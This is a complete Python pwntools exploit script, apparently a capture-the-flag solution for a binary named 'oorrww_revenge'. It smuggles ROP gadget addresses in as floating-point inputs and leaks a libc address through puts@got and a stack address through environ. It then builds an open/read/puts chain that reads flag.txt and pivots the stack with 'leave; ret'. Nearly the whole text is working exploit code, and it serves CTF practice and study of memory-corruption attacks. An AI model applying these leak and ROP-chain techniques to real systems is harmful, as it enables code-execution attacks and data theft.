#!/usr/bin/python3
from pwn import process, p64, u64, struct, log

shell = process("./oorrww_revenge")

def rop(addr):
    double = struct.unpack("d", p64(addr))[0]
    shell.sendlineafter(b":\n", str(double).encode())

for i in range(20):
    shell.sendlineafter(b":\n", b".")

rop(0x401203) # pop rax; ret;
rop(0x401203) # pop rax; ret;
rop(0x403fc8) # puts@got
rop(0x4012da) # mov rdi, rax; call 0x30c0; nop; pop rbp; ret;
rop(0x404100) # value for pop
rop(0x401110) # _start()

for i in range(4):
    shell.sendlineafter(b":\n", b".")

libc_base = u64(shell.recvline().strip().ljust(8, b"\x00")) - 0x80e50

for i in range(21):
    shell.sendlineafter(b":\n", b".")

rop(libc_base + 0x02a3e5) # pop rdi; ret;
rop(0x1)                  # fd
rop(libc_base + 0x16333a) # pop rsi; ret;
rop(libc_base + 0x222200) # environ
rop(libc_base + 0x0904a9) # pop rdx; pop rbx; ret;
rop(0x8)                  # len
rop(0x0)                  # padding for pop
rop(libc_base + 0x114870) # write()
rop(0x401110)             # _start()

stack_base = u64(shell.recv(8)) - 0x368

rop(0x7478742e67616c66)   # "flag.txt"
rop(0x0)                  # "\x00"
rop(libc_base + 0x02a3e5) # pop rdi; ret;
rop(stack_base)           # &"flag.txt"
rop(libc_base + 0x16333a) # pop rsi; ret;
rop(0x0)                  # flags
rop(libc_base + 0xd8380)  # mov rax, 2; ret;
rop(libc_base + 0x91316)  # syscall; ret;
rop(libc_base + 0x2a3e5)  # pop rdi; ret;
rop(0x3)                  # descriptor
rop(libc_base + 0x2be51)  # pop rsi; ret;
rop(libc_base + 0x21a1e0) # .data
rop(libc_base + 0x904a9)  # pop rdx; pop rbx; ret;
rop(0x40)                 # len
rop(0x0)                  # padding for pop
rop(libc_base + 0x1147d0) # read()
rop(libc_base + 0x2a3e5)  # pop rdi; ret;
rop(libc_base + 0x21a1e0) # .data
rop(libc_base + 0x80e50)  # puts()

shell.sendlineafter(b":\n", b".") # canary

rop(stack_base + 8)      # pivot addr
rop(libc_base + 0x4da83) # leave; ret;

for i in range(8):
    shell.sendlineafter(b":\n", b".") # padding

flag = shell.recvline_contains(b"L3AK")
log.info(f"Flag: {flag.decode()}")
